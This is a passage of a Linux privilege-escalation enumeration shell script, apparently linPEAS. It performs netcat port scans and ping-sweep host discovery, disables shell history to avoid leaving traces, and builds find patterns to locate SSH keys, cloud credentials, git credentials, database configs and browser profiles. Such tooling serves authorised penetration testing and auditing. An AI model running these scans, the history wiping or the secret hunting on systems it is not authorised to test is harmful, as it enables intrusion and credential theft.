8400 8402 8443 8500 8600 8649 8651 8652 8654 8701 8800 8873 8888 8899 8994 9000 9001 9002 9003 9009 9010 9011 9040 9050 9071 9080 9081 9090 9091 9099 9100 9101 9102 9103 9110 9111 9200 9207 9220 9290 9415 9418 9485 9500 9502 9503 9535 9575 9593 9594 9595 9618 9666 9876 9877 9878 9898 9900 9917 9929 9943 9944 9968 9998 9999 10000 10001 10002 10003 10004 10009 10010 10012 10024 10025 10082 10180 10215 10243 10566 10616 10617 10621 10626 10628 10629 10778 11110 11111 11967 12000 12174 12265 12345 13456 13722 13782 13783 14000 14238 14441 14442 15000 15002 15003 15004 15660 15742 16000 16001 16012 16016 16018 16080 16113 16992 16993 17877 17988 18040 18101 18988 19101 19283 19315 19350 19780 19801 19842 20000 20005 20031 20221 20222 20828 21571 22939 23502 24444 24800 25734 25735 26214 27000 27352 27353 27355 27356 27715 28201 30000 30718 30951 31038 31337 32768 32769 32770 32771 32772 32773 32774 32775 32776 32777 32778 32779 32780 32781 32782 32783 32784 32785 33354 33899 34571 34572 34573 35500 38292 40193 40911 41511 42510 44176 44442 44443 44501 45100 48080 49152 49153 49154 49155 49156 49157 49158 49159 49160 49161 49163 49165 49167 49175 49176 49400 49999 50000 50001 50002 50003 50006 50300 50389 50500 50636 50800 51103 51493 52673 52822 52848 52869 54045 54328 55055 55056 55555 55600 56737 56738 57294 57797 58080 60020 60443 61532 61900 62078 63331 64623 64680 65000 65129 65389 3 4 6 7 9 13 17 19 20 21 22 23 24 25 26 30 32 33 37 42 43 49 53 70 79 80 81 82 83 84 85 88 89 90 99 100 106 109 110 111 113 119 125 135 139 143 144 146 161 163 179 199 211 212 222 254 255 256 259 264 280 301 306 311 340 366 389 406 407 416 417 425 427 443 444 445 458 464 465 481 497 500 512 513 514 515 524 541 543 544 545 548 554 555 563 587 593 616 617 625 631 636 646 648 666 667 668 683 687 691 700 705 711 714 720 722 726 749 765 777 783 787 800 801 808 843 873 880 888 898 900 901 902 903 911 912 981 987 990 992 993 995 999 1000 1001 1002 1007 1009 1010 1011 1021 1022 1023 1024 1025 1026 1027 1028 1029 1030 1031 1032 1033 1034 1035 1036 1037 1038 1039 1040 1041 1042 1043 1044 1045 1046 1047 1048 1049 1050 1051 1052 1053 1054 1055 1056 1057 1058 1059 1060 1061 1062 1063 1064 1065 1066 1067 1068 1069 1070 1071 1072 1073 1074 1075 1076 1077 1078 1079 1080 1081 1082 1083 1084 1085 1086 1087 1088 1089 1090 1091 1092 1093 1094 1095 1096 1097 1098 1099 1100 1102 1104 1105 1106 1107 1108 1110 1111 1112 1113 1114 1117 1119 1121 1122 1123 1124 1126 1130 1131 1132 1137 1138 1141 1145 1147 1148 1149 1151 1152 1154 1163 1164 1165 1166 1169 1174 1175 1183 1185 1186 1187 1192 1198 1199 1201 1213 1216 1217 1218 1233 1234 1236 1244 1247 1248 1259 1271 1272 1277 1287 1296 1300 1301 1309 1310 1311 1322 1328 1334 1352 1417 1433 1434 1443 1455 1461 1494 1500 1501 1503 1521 1524 1533 1556 1580 1583 1594 1600 1641 1658 1666 1687 1688 1700 1717 1718 1719 1720 1721 1723 1755 1761 1782 1783 1801 1805 1812 1839 1840 1862 1863 1864 1875 1900 1914 1935 1947 1971 1972 1974 1984 1998 1999 2000 2001 2002 2003 2004 2005 2006 2007 2008 2009 2010 2013 2020 2021 2022 2030 2033 2034 2035 2038 2040 2041 2042 2043 2045 2046 2047 2048 2049 2065 2068 2099 2100 2103 2105 2106 2107 2111 2119 2121 2126 2135 2144 2160 2161 2170 2179 2190 2191 2196 2200 2222 2251 2260 2288 2301 2323 2366 2381 2382 2383 2393 2394 2399 2401 2492 2500 2522 2525 2557 2601 2602 2604 2605 2607 2608 2638 2701 2702 2710 2717 2718 2725 2800 2809 2811 2869 2875 2909 2910 2920 2967 2968 2998 3000 3001 3003 3005 3006 3007 3011 3013 3017 3030 3031 3052 3071 3077 3128 3168 3211 3221 3260 3261 3268 3269 3283 3300 3301 3306 3322 3323 3324 3325 3333 3351 3367 3369 3370 3371 3372 3389 3390 3404 3476 3493 3517 3527 3546 3551 3580 3659 3689 3690 3703 3737 3766 3784 3800 3801 3809 3814 3826 3827 3828 3851 3869 3871 3878 3880 3889 3905 3914 3918 3920 3945 3971 3986 3995 3998 4000 4001 4002 4003 4004 4005 4006 4045 4111 4125 4126 4129 4224 4242 4279 4321 4343 4443 4444 4445 4446 4449 4550 4567 4662 4848 4899 4900 4998 5000 5001 5002 5003 5004 5009 5030 5033 5050 5051 5054 5060 5061 5080 5087 5100 5101 5102 5120 5190 5200 5214 5221 5222 5225 5226 5269 5280 5298 5357 5405 5414 5431 5432 5440 5500 5510 5544 5550 5555 5560 5566 5631 5633 5666 5678 5679 5718 5730 5800 5801 5802 5810 5811 5815 5822 5825 5850 5859 5862 5877 5900 5901 5902 5903 5904 5906 5907 5910 5911 5915 5922 5925 5950 5952 5959 5960 5961 5962 5963 5987 5988 5989 5998 5999 6000 6001 6002 6003 6004 6005 6006 6007 6009 6025 6059 6100 6101 6106 6112 6123 6129 6156 6346 6389 6502 6510 6543 6547 6565 6566 6567 6580 6646 6666 6667 6668 6669 6689 6692 6699 6779 6788 6789 6792 6839 6881 6901 6969 7000 7001 7002 7004 7007 7019 7025 7070 7100 7103 7106 7200 7201 7402 7435 7443 7496 7512 7625 7627 7676 7741 7777 7778 7800 7911 7920 7921 7937 7938 7999 8000 8001 8002 8007 8008 8009 8010 8011 8021 8022 8031 8042 8045 8080 8081 8082 8083 8084 8085 8086 8087 8088 8089 8090 8093 8099 8100 8180 8181 8192 8193 8194 8200 8222 8254 8290 8291 8292 8300 8333 8383 8400 8402 8443 8500 8600 8649 8651 8652 8654 8701 8800 8873 8888 8899 8994 9000 9001 9002 9003 9009 9010 9011 9040 9050 9071 9080 9081 9090 9091 9099 9100 9101 9102 9103 9110 9111 9200 9207 9220 9290 9415 9418 9485 9500 9502 9503 9535 9575 9593 9594 9595 9618 9666 9876 9877 9878 9898 9900 9917 9929 9943 9944 9968 9998 9999 10000 10001 10002 10003 10004 10009 10010 10012 10024 10025 10082 10180 10215 10243 10566 10616 10617 10621 10626 10628 10629 10778 11110 11111 11967 12000 12174 12265 12345 13456 13722 13782 13783 14000 14238 14441 14442 15000 15002 15003 15004 15660 15742 16000 16001 16012 16016 16018 16080 16113 16992 16993 17877 17988 18040 18101 18988 19101 19283 19315 19350 19780 19801 19842 20000 20005 20031 20221 20222 20828 21571 22939 23502 24444 24800 25734 25735 26214 27000 27352 27353 27355 27356 27715 28201 30000 30718 30951 31038 31337 32768 32769 32770 32771 32772 32773 32774 32775 32776 32777 32778 32779 32780 32781 32782 32783 32784 32785 33354 33899 34571 34572 34573 35500 38292 40193 40911 41511 42510 44176 44442 44443 44501 45100 48080 49152 49153 49154 49155 49156 49157 49158 49159 49160 49161 49163 49165 49167 49175 49176 49400 49999 50000 50001 50002 50003 50006 50300 50389 50500 50636 50800 51103 51493 52673 52822 52848 52869 54045 54328 55055 55056 55555 55600 56737 56738 57294 57797 58080 60020 60443 61532 61900 62078 63331 64623 64680 65000 65129 65389"
  else
    printf $Y"[+]$B Ports going to be scanned: $PORTS" $NC | tr '\n' " "
    printf "$NC\n"
  fi

  for port in $PORTS; do
    ($NC_SCAN $IP $port 2>&1 | grep -iv "Connection refused\|No route\|Version\|bytes\| out" | sed -${E} "s,[0-9\.],${C}[1;31m&${C}[0m,g") &
  done
  wait
}

discover_network (){
  #Check if IP and Netmask are correct and the use fping or ping to find hosts
  basic_net_info

  printf $B"════════════════════════════════════╣ "$GREEN"Network Discovery"$B" ╠════════════════════════════════════\n"$NC

  DISCOVERY=$1
  IP=$(echo $DISCOVERY | cut -d "/" -f 1)
  NETMASK=$(echo $DISCOVERY | cut -d "/" -f 2)
  
  if [ -z $IP ] || [ -z $NETMASK ]; then
    printf $RED"[-] Err: Bad format. Example: 127.0.0.1/24"$NC;
    printf $B"$HELP"$NC;
    exit 0
  fi

  #Using fping if possible
  if [ "$FPING" ]; then 
    $FPING -a -q -g $DISCOVERY | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
  
  #Loop using ping
  else
    if [ $NETMASK -eq "24" ]; then
      printf $Y"[+]$GREEN Netmask /24 detected, starting...\n$NC"
      icmp_recon $IP
      
    elif [ $NETMASK -eq "16" ]; then
      printf $Y"[+]$GREEN Netmask /16 detected, starting...\n$NC"
      for i in $(seq 1 254)
      do	
        NEWIP=$(echo $IP | cut -d "." -f 1,2).$i.1
        icmp_recon $NEWIP
      done
    else
      printf $RED"[-] Err: Sorry, only Netmask /24 and /16 supported in ping mode. Netmask detected: $NETMASK"$NC;
      exit 0
    fi
  fi
}

discovery_port_scan (){
  basic_net_info

  #Check if IP and Netmask are correct and the use nc to find hosts. By default check ports: 22 80 443 445 3389
  printf $B"═══════════════════════════╣ "$GREEN"Network Discovery (scanning ports)"$B" ╠═════════════════════════════\n"$NC
  DISCOVERY=$1
  MYPORTS=$2

  IP=$(echo $DISCOVERY | cut -d "/" -f 1)
  NETMASK=$(echo $DISCOVERY | cut -d "/" -f 2)
  echo "Scanning: $DISCOVERY"
  
  if [ -z "$IP" ] || [ -z "$NETMASK" ] || [ "$IP" = "$NETMASK" ]; then
    printf $RED"[-] Err: Bad format. Example: 127.0.0.1/24\n"$NC;
    if [ "$IP" = "$NETMASK" ]; then
      printf $RED"[*] This options is used to find active hosts by scanning ports. If you want to perform a port scan of a host use the options: $Y-i <IP> [-p <PORT(s)>]\n\n"$NC;
    fi
    printf $B"$HELP"$NC;
    exit 0
  fi

  PORTS="22 80 443 445 3389 `echo \"$MYPORTS\" | tr \",\" \" \"`"
  PORTS=`echo "$PORTS" | tr " " "\n" | sort -u` #Delete repetitions

  if [ "$NETMASK" -eq "24" ]; then
    printf $Y"[+]$GREEN Netmask /24 detected, starting...\n" $NC
		tcp_recon $IP "$PORTS"
	
	elif [ "$NETMASK" -eq "16" ]; then
    printf $Y"[+]$GREEN Netmask /16 detected, starting...\n" $NC
		for i in $(seq 0 255)
		do	
			NEWIP=$(echo $IP | cut -d "." -f 1,2).$i.1
			tcp_recon $NEWIP "$PORTS"
		done
  else
      printf $RED"[-] Err: Sorry, only netmask /24 and /16 are supported in port discovery mode. Netmask detected: $NETMASK\n"$NC;
      exit 0
	fi
}


###########################################
#---) Exporting history env variables (---#
###########################################

if ! [ "$NOTEXPORT" ]; then
  unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH
  export HISTFILE=/dev/null
  export HISTSIZE=0
  export HISTFILESIZE=0
fi


###########################################
#-----------) Some Basic Info (-----------#
###########################################

printf $B"════════════════════════════════════╣ "$GREEN"Basic information"$B" ╠════════════════════════════════════\n"$NC
printf $LG"OS: "$NC
(cat /proc/version || uname -a ) 2>/dev/null | sed -${E} "s,$kernelDCW_Ubuntu_Precise_1,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_2,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_3,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_4,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_5,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_6,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_1,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_2,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_3,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_4,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Ubuntu_Xenial,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Rhel5_1,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Rhel5_2,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Rhel5_3,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Rhel6_1,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Rhel6_2,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Rhel6_3,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Rhel6_4,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelDCW_Rhel7,${C}[1;31;103m&${C}[0m," | sed -${E} "s,$kernelB,${C}[1;31m&${C}[0m,"
printf $LG"User & Groups: "$NC
(id || (whoami && groups)) 2>/dev/null | sed -${E} "s,$groupsB,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$groupsVB,${C}[1;31;103m&${C}[0m,g" | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m,g" | sed -${E} "s,$nosh_usrs,${C}[1;34m&${C}[0m,g" | sed -${E} "s,$knw_usrs,${C}[1;32m&${C}[0m,g" | sed -${E} "s,$knw_grps,${C}[1;32m&${C}[0m,g" | sed "s,$USER,${C}[1;95m&${C}[0m,g" | sed -${E} "s,$idB,${C}[1;31m&${C}[0m,g"
printf $LG"Hostname: "$NC
hostname 2>/dev/null
printf $LG"Writable folder: "$NC;
echo $Wfolder
if [ "$DISCOVER_BAN_GOOD" ]; then
  printf $Y"[+] $DISCOVER_BAN_GOOD\n"$NC
else
  printf $RED"[-] $DISCOVER_BAN_BAD\n"$NC
fi

if [ "$SCAN_BAN_GOOD" ]; then
  printf $Y"[+] $SCAN_BAN_GOOD\n"$NC
else
  printf $RED"[-] $SCAN_BAN_BAD\n"$NC
fi
if [ "`command -v nmap 2>/dev/null`" ];then
  NMAP_GOOD=$GREEN"nmap$B is available for network discover & port scanning, you should use it yourself"
  printf $Y"[+] $NMAP_GOOD\n"$NC
fi
echo ""
echo ""

###########################################
#--------) Check if network jobs (--------#
###########################################
if [ "$PORTS" ]; then
  if [ "$SCAN_BAN_GOOD" ]; then
    if [ "`echo -n $PORTS | sed 's,[0-9, ],,g'`" ]; then
      printf $RED"[-] Err: Symbols detected in the port, for discovering purposes select only 1 port\n"$NC;
      printf $B"$HELP"$NC;
      exit 0
    else
      #Select the correct configuration of the netcat found
      select_nc
    fi
  else
    printf $RED"  Err: Port scan not possible, any netcat in PATH\n"$NC;
    printf $B"$HELP"$NC;
    exit 0
  fi
fi  

if [ "$DISCOVERY" ]; then
  if [ "$PORTS" ]; then
    discovery_port_scan $DISCOVERY $PORTS
  else
    if [ "$DISCOVER_BAN_GOOD" ]; then
      discover_network $DISCOVERY
    else
      printf $RED"  Err: Discovery not possible, no fping or ping in PATH\n"$NC;
    fi
  fi
  exit 0

elif [ "$IP" ]; then
  select_nc 
  tcp_port_scan $IP "$PORTS"
  exit 0
fi


if [ "`echo $CHECKS | grep ProCronSrvcsTmrsSocks`" ] || [ "`echo $CHECKS | grep IntFiles`" ] || [ "`echo $CHECKS | grep SofI`" ]; then
  ###########################################
  #----------) Caching Finds (--------------#
  ###########################################
  
  prep_to_find() {
      echo "$1" | sed 's/ /" -o -name "/g' | sed 's/^/ -name "/g' | sed 's/$/" /g'
  }

  printf $GREEN"Caching directories using$Y $THREADS$GREEN threads "$NC
  SYSTEMD_RELEVANT_NAMES="*.service"
  TIMERS_RELEVANT_NAMES="*.timer"
  SOCKETS_RELEVANT_NAMES="*.socket"
  DBUS_RELEVANT_NAMES="system.d session.d"

  MYSQL_RELEVANT_NAMES="mysql"
  POSTGRESQL_RELEVANT_NAMES="pgadmin*.db pg_hba.conf postgresql.conf pgsql.conf"
  APACHE_RELEVANT_NAMES="sites-enabled 000-default"
  PHP_RELEVANT_NAMES="sess_* *config*.php database.php db.php storage.php"
  WORDPRESS_RELEVANT_NAMES="wp-config.php"
  DRUPAL_RELEVANT_NAMES="settings.php"
  MOODLE_RELEVANT_NAMES="/config.php"
  TOMCAT_RELEVANT_NAMES="tomcat-users.xml"
  MONGO_RELEVANT_NAMES="mongod*.conf"
  SUPERVISORD_RELEVANT_NAMES="supervisord.conf"
  CESI_RELEVANT_NAMES="cesi.conf"
  RSYNCD_RELEVANT_NAMES="rsyncd.conf rsyncd.secrets"
  HOSTAPAD_RELEVANT_NAMES="hostapd.conf"
  ANACONDA_KS_RELEVANT_NAMES="anaconda-ks.cfg"
  VNC_RELEVANT_NAMES=".vnc"
  LDAP_RELEVANT_NAMES="ldap"
  OVPN_RELEVANT_NAMES="*.ovpn"
  SSH_RELEVANT_NAMES="id_dsa* id_rsa* known_hosts authorized_hosts authorized_keys *.pem *.cer *.crt *.csr *.der *.pfx *.p12 agent* config vault-ssh-helper.hcl .vault-token"
  CLOUD_KEYS_RELEVANT_NAMES="credentials credentials.db legacy_credentials.db access_tokens.db accessTokens.json azureProfile.json cloud.cfg"
  KERBEROS_RELEVANT_NAMES="krb5.conf krb5.keytab .k5login kadm5.acl"
  KIBANA_RELEVANT_NAMES="kibana.y*ml"
  KNOCK_RELEVANT_NAMES="knockd"
  LOGSTASH_RELEVANT_NAMES="logstash"
  ELASTICSEARCH_RELEVANT_NAMES="elasticsearch.y*ml"
  COUCHDB_RELEVANT_NAMES="couchdb"
  REDIS_RELEVANT_NAMES="redis.conf"
  MOSQUITTO_RELEVANT_NAMES="mosquitto.conf"
  NEO4J_RELEVANT_NAMES="neo4j"
  ERLANG_RELEVANT_NAMES=".erlang.cookie"
  GVM_RELEVANT_NAMES="gvm-tools.conf"
  IPSEC_RELEVANT_NAMES="ipsec.secrets ipsec.conf"
  IRSSI_RELEVANT_NAMES=".irssi"
  KEYRING_RELEVANT_NAMES="keyrings *.keyring *.keystore"
  FILEZILLA_RELEVANT_NAMES="filezilla"
  BACKUPMANAGER_RELEVANT_NAMES="storage.php database.php"
  PASSWD_SPLUNK_RELEVANT_NAMES="passwd"
  GITLAB_RELEVANT_NAMES="secrets.yml gitlab.yml gitlab.rb"
  PGP_RELEVANT_NAMES="*.pgp *.gpg .gnupg"
  VIM_RELEVANT_NAMES=".*.swp .viminfo"
  DOCKER_RELEVANT_NAMES="docker.sock docker.socket Dockerfile docker-compose.yml"
  FIREFOX_RELEVANT_NAMES=".mozilla"
  CHROME_RELEVANT_NAMES="google-chrome"
  AUTOLOGIN_RELEVANT_NAMES="autologin autologin.conf"

  DB_RELEVANT_NAMES="*.db *.sqlite *.sqlite3 *.sql"
  INSTERESTING_RELEVANT_NAMES=".msmtprc .env .google_authenticator *_history .recently-used.xbel .lesshst .sudo_as_admin_successful .profile *bashrc *httpd.conf *.plan .htpasswd .gitconfig .git-credentials .git .svn *.rhost hosts.equiv .ldaprc"
  PASSWORD_RELEVANT_NAMES="*password* *credential* creds*"
  BACKUPS_DIRS_RELEVANT_NAMES="backup backups"


  FIND_SYSTEMD_RELEVANT_NAMES=$(prep_to_find "$SYSTEMD_RELEVANT_NAMES")
  FIND_TIMERS_RELEVANT_NAMES=$(prep_to_find "$TIMERS_RELEVANT_NAMES")
  FIND_SOCKETS_RELEVANT_NAMES=$(prep_to_find "$SOCKETS_RELEVANT_NAMES")
  FIND_DBUS_RELEVANT_NAMES=$(prep_to_find "$DBUS_RELEVANT_NAMES")

  FIND_MYSQL_RELEVANT_NAMES=$(prep_to_find "$MYSQL_RELEVANT_NAMES")
  FIND_POSTGRESQL_RELEVANT_NAMES=$(prep_to_find "$POSTGRESQL_RELEVANT_NAMES")
  FIND_APACHE_RELEVANT_NAMES=$(prep_to_find "$APACHE_RELEVANT_NAMES")
  FIND_PHP_RELEVANT_NAMES=$(prep_to_find "$PHP_RELEVANT_NAMES")
  FIND_WORDPRESS_RELEVANT_NAMES=$(prep_to_find "$WORDPRESS_RELEVANT_NAMES")
  FIND_DRUPAL_RELEVANT_NAMES=$(prep_to_find "$DRUPAL_RELEVANT_NAMES")
  FIND_MOODLE_RELEVANT_NAMES=$(prep_to_find "$MOODLE_RELEVANT_NAMES")
  FIND_TOMCAT_RELEVANT_NAMES=$(prep_to_find "$TOMCAT_RELEVANT_NAMES")
  FIND_MONGO_RELEVANT_NAMES=$(prep_to_find "$MONGO_RELEVANT_NAMES")
  FIND_SUPERVISORD_RELEVANT_NAMES=$(prep_to_find "$SUPERVISORD_RELEVANT_NAMES")
  FIND_CESI_RELEVANT_NAMES=$(prep_to_find "$CESI_RELEVANT_NAMES")
  FIND_RSYNCD_RELEVANT_NAMES=$(prep_to_find "$RSYNCD_RELEVANT_NAMES")
  FIND_HOSTAPAD_RELEVANT_NAMES=$(prep_to_find "$HOSTAPAD_RELEVANT_NAMES")
  FIND_ANACONDA_KS_RELEVANT_NAMES=$(prep_to_find "$ANACONDA_KS_RELEVANT_NAMES")
  FIND_VNC_RELEVANT_NAMES=$(prep_to_find "$VNC_RELEVANT_NAMES")
  FIND_LDAP_RELEVANT_NAMES=$(prep_to_find "$LDAP_RELEVANT_NAMES")
  FIND_OVPN_RELEVANT_NAMES=$(prep_to_find "$OVPN_RELEVANT_NAMES")
  FIND_SSH_RELEVANT_NAMES=$(prep_to_find "$SSH_RELEVANT_NAMES")
  FIND_CLOUD_KEYS_RELEVANT_NAMES=$(prep_to_find "$CLOUD_KEYS_RELEVANT_NAMES")
  FIND_KERBEROS_RELEVANT_NAMES=$(prep_to_find "$KERBEROS_RELEVANT_NAMES")
  FIND_KIBANA_RELEVANT_NAMES=$(prep_to_find "$KIBANA_RELEVANT_NAMES")
  FIND_KNOCK_RELEVANT_NAMES=$(prep_to_find "$sK_RELEVANT_NAMES")
  FIND_LOGSTASH_RELEVANT_NAMES=$(prep_to_find "$LOGSTASH_RELEVANT_NAMES")
  FIND_ELASTICSEARCH_RELEVANT_NAMES=$(prep_to_find "$ELASTICSEARCH_RELEVANT_NAMES")
  FIND_COUCHDB_RELEVANT_NAMES=$(prep_to_find "$COUCHDB_RELEVANT_NAMES")
  FIND_REDIS_RELEVANT_NAMES=$(prep_to_find "$REDIS_RELEVANT_NAMES")
  FIND_MOSQUITTO_RELEVANT_NAMES=$(prep_to_find "$MOSQUITTO_RELEVANT_NAMES")
  FIND_NEO4J_RELEVANT_NAMES=$(prep_to_find "$NEO4J_RELEVANT_NAMES")
  FIND_ERLANG_RELEVANT_NAMES=$(prep_to_find "$ERLANG_RELEVANT_NAMES")
  FIND_GVM_RELEVANT_NAMES=$(prep_to_find "$GVM_RELEVANT_NAMES")
  FIND_IPSEC_RELEVANT_NAMES=$(prep_to_find "$IPSEC_RELEVANT_NAMES")
  FIND_IRSSI_RELEVANT_NAMES=$(prep_to_find "$IRSSI_RELEVANT_NAMES")
  FIND_KEYRING_RELEVANT_NAMES=$(prep_to_find "$KEYRING_RELEVANT_NAMES")
  FIND_FILEZILLA_RELEVANT_NAMES=$(prep_to_find "$FILEZILLA_RELEVANT_NAMES")
  FIND_BACKUPMANAGER_RELEVANT_NAMES=$(prep_to_find "$BACKUPMANAGER_RELEVANT_NAMES")
  FIND_PASSWD_SPLUNK_RELEVANT_NAMES=$(prep_to_find "$PASSWD_SPLUNK_RELEVANT_NAMES")
  FIND_GITLAB_RELEVANT_NAMES=$(prep_to_find "$GITLAB_RELEVANT_NAMES")
  FIND_PGP_RELEVANT_NAMES=$(prep_to_find "$PGP_RELEVANT_NAMES")
  FIND_VIM_RELEVANT_NAMES=$(prep_to_find "$VIM_RELEVANT_NAMES")
  FIND_DOCKER_RELEVANT_NAMES=$(prep_to_find "$DOCKER_RELEVANT_NAMES")
  FIND_FIREFOX_RELEVANT_NAMES=$(prep_to_find "$FIREFOX_RELEVANT_NAMES")
  FIND_CHROME_RELEVANT_NAMES=$(prep_to_find "$CHROME_RELEVANT_NAMES")
  FIND_AUTOLOGIN_RELEVANT_NAMES=$(prep_to_find "$AUTOLOGIN_RELEVANT_NAMES")

  FIND_DB_RELEVANT_NAMES=$(prep_to_find "$DB_RELEVANT_NAMES")
  FIND_INSTERESTING_RELEVANT_NAMES=$(prep_to_find "$INSTERESTING_RELEVANT_NAMES")
  FIND_PASSWORD_RELEVANT_NAMES=$(prep_to_find "$PASSWORD_RELEVANT_NAMES")
  FIND_BACKUPS_DIRS_RELEVANT_NAMES=$(prep_to_find "$BACKUPS_DIRS_RELEVANT_NAMES")

  #Get home 
  HOMESEARCH="/home/ /Users/ /root/ `cat /etc/passwd 2>/dev/null | grep "sh$" | cut -d ":" -f 6 | grep -Ev "^/root|^/home|^/Users" | tr "\n" " "`"
  if [ ! "`echo \"$HOMESEARCH\" | grep \"$HOME\"`" ] && [ ! "`echo \"$HOMESEARCH\" | grep -E \"^/root|^/home|^/Users\"`" ]; then #If not listed and not in /home, /Users/ or /root, add current home folder
    HOMESEARCH="$HOME $HOMESEARCH"
  fi

  # Directories
  CONT_THREADS=0
  FIND_DIR_VAR=`eval_bckgrd "find /var -type d $FIND_BACKUPS_DIRS_RELEVANT_NAMES -o $FIND_FILEZILLA_RELEVANT_NAMES -o $FIND_MYSQL_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_LDAP_RELEVANT_NAMES -o $FIND_KERBEROS_RELEVANT_NAMES -o $FIND_LOGSTASH_RELEVANT_NAMES -o $FIND_COUCHDB_RELEVANT_NAMES -o $FIND_NEO4J_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_IRSSI_RELEVANT_NAMES -o $FIND_KEYRING_RELEVANT_NAMES 2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`
  FIND_DIR_ETC=`eval_bckgrd "find /etc -type d $FIND_BACKUPS_DIRS_RELEVANT_NAMES -o $FIND_FILEZILLA_RELEVANT_NAMES -o $FIND_MYSQL_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_LDAP_RELEVANT_NAMES -o $FIND_KERBEROS_RELEVANT_NAMES -o $FIND_LOGSTASH_RELEVANT_NAMES -o $FIND_COUCHDB_RELEVANT_NAMES -o $FIND_NEO4J_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_DBUS_RELEVANT_NAMES -o $FIND_IRSSI_RELEVANT_NAMES -o $FIND_KEYRING_RELEVANT_NAMES 2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`
  FIND_DIR_HOME=`eval_bckgrd "find $HOMESEARCH -type d $FIND_CHROME_RELEVANT_NAMES -o $FIND_FIREFOX_RELEVANT_NAMES -o $FIND_BACKUPS_DIRS_RELEVANT_NAMES -o $FIND_FILEZILLA_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_VNC_RELEVANT_NAMES -o $FIND_LDAP_RELEVANT_NAMES -o $FIND_KERBEROS_RELEVANT_NAMES -o $FIND_LOGSTASH_RELEVANT_NAMES -o $FIND_COUCHDB_RELEVANT_NAMES -o $FIND_NEO4J_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_IRSSI_RELEVANT_NAMES -o $FIND_KEYRING_RELEVANT_NAMES 2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`
  FIND_DIR_TMP=`eval_bckgrd "find /tmp -type d $FIND_BACKUPS_DIRS_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_LDAP_RELEVANT_NAMES -o $FIND_KERBEROS_RELEVANT_NAMES -o $FIND_LOGSTASH_RELEVANT_NAMES -o $FIND_COUCHDB_RELEVANT_NAMES -o $FIND_NEO4J_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_KEYRING_RELEVANT_NAMES 2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`
  FIND_DIR_USR=`eval_bckgrd "find /usr -type d $FIND_BACKUPS_DIRS_RELEVANT_NAMES -o $FIND_MYSQL_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_LDAP_RELEVANT_NAMES -o $FIND_KERBEROS_RELEVANT_NAMES -o $FIND_LOGSTASH_RELEVANT_NAMES -o $FIND_COUCHDB_RELEVANT_NAMES -o $FIND_NEO4J_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_IRSSI_RELEVANT_NAMES -o $FIND_KEYRING_RELEVANT_NAMES 2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`
  FIND_DIR_OPT=`eval_bckgrd "find /opt -type d $FIND_BACKUPS_DIRS_RELEVANT_NAMES -o $FIND_FILEZILLA_RELEVANT_NAMES -o $FIND_APACHE_RELEVANT_NAMES -o $FIND_LDAP_RELEVANT_NAMES -o $FIND_KERBEROS_RELEVANT_NAMES -o $FIND_LOGSTASH_RELEVANT_NAMES -o $FIND_COUCHDB_RELEVANT_NAMES -o $FIND_NEO4J_RELEVANT_NAMES -o $FIND_INSTERESTING_RELEVANT_NAMES -o $FIND_IRSSI_RELEVANT_NAMES -o $FIND_KEYRING_RELEVANT_NAMES 2>/dev/null | sort; printf \\\$Y'. '\\\$NC 1>&2;"`
